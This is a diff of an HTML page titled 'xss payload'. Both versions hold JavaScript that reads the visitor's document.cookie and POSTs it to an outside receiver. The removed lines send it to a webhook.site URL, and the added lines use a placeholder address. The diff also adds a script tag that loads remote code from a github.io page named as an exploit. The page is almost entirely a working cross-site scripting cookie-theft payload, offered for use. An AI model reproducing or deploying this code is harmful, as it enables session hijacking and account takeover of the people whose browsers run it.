@@ -6,34 +6,38 @@
   <title>xss payload</title>
 </head>
 <body style="text-align: center;" >
-  <br>
-  <h1>paste your xss payload here</h1>
+
+        <br>
+  <h1>hack the planet</h1>
+
+    <script>
+      const cookie = document.cookie;
+  const data = cookie
   
-  <script>
-    const cookie = document.cookie;
-const data = cookie
+  // Create a new XMLHttpRequest object
+  const xhr = new XMLHttpRequest();
+  
+  // Set the request method and URL
+  xhr.open('POST', 'my reciever address', true);
+  
+  // Set the request headers
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  
+  // Send the request with the cookie data
+  xhr.send('cookie=' + data);
+  
+  // Listen for the response
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      console.log('Cookie sent successfully!');
+    } else {
+      console.log('Error sending cookie: ' + xhr.statusText);
+    }
+  };
+    </script>
 
-// Create a new XMLHttpRequest object
-const xhr = new XMLHttpRequest();
 
-// Set the request method and URL
-xhr.open('POST', 'https://webhook.site/2ca436ff-5ed0-4307-a84d-3617f632b115', true);
-
-// Set the request headers
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-
-// Send the request with the cookie data
-xhr.send('cookie=' + data);
-
-// Listen for the response
-xhr.onload = function() {
-  if (xhr.status === 200) {
-    console.log('Cookie sent successfully!');
-  } else {
-    console.log('Error sending cookie: ' + xhr.statusText);
-  }
-};
-  </script>
+  <script src="https://mistdexploit.github.io/xsspayload.github.io/index.html"></script>
 
 </body>
 </html>
